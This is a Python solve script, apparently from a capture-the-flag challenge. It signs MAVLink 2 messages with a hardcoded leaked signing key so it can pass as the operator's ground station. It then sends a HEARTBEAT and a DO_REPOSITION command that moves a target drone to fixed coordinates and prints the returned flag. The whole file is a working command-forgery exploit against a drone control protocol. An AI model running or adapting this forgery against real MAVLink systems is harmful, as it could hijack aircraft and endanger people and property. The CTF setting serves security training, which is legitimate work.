#!/usr/bin/env python3
"""Authenticate as the operator against the live uplink with the leaked signing
key and issue a freshly signed command.

Usage: python3 solve.py <host> <port> [key_hex]

key_hex defaults to the key recovered from the capture by parse_key.py. The
server (a MAVLink 2 TCP endpoint) only checks the signature and that the signing
timestamp is current, so a fresh signed HEARTBEAT + COMMAND_INT DO_REPOSITION
from sysid 255 is accepted and the audit receipt carries the flag.
"""
import os
import sys
import time

os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil
from pymavlink.dialects.v20 import ardupilotmega as mav

host, port = sys.argv[1], int(sys.argv[2])
key = bytes.fromhex(sys.argv[3] if len(sys.argv) > 3
                    else "8f2b4e71a6c3d05f9217bc84e63a1d57f0482c6b9e13a7d5c84f26019bd3ea60")

m = mavutil.mavlink_connection('tcp:%s:%d' % (host, port),
                               source_system=255, source_component=190,
                               dialect='ardupilotmega')
# enable outgoing per-frame signing with a current timestamp (10us units since 2015-01-01)
m.mav.signing.secret_key = key
m.mav.signing.link_id = 0
m.mav.signing.timestamp = int((time.time() - 1420070400) * 100000)
m.mav.signing.sign_outgoing = True


def drain(sec, label):
    end = time.time() + sec
    while time.time() < end:
        msg = m.recv_match(blocking=True, timeout=1)
        if msg is None or msg.get_type() == 'BAD_DATA':
            continue
        if msg.get_type() == 'STATUSTEXT':
            print("[%s] %s" % (label, msg.text))


drain(3.0, "init")

# a signed heartbeat so the station sees the operator as live, then the command
m.mav.heartbeat_send(mav.MAV_TYPE_GCS, mav.MAV_AUTOPILOT_INVALID, 0, 0, mav.MAV_STATE_ACTIVE)
drain(2.0, "hb")

m.mav.command_int_send(
    1, 1,                                        # target drone sys=1 comp=1
    mav.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
    mav.MAV_CMD_DO_REPOSITION, 0, 0,
    -1, 1, 0, float('nan'),
    int(47.3977 * 1e7), int(8.5456 * 1e7), 50.0)
drain(6.0, "repos")
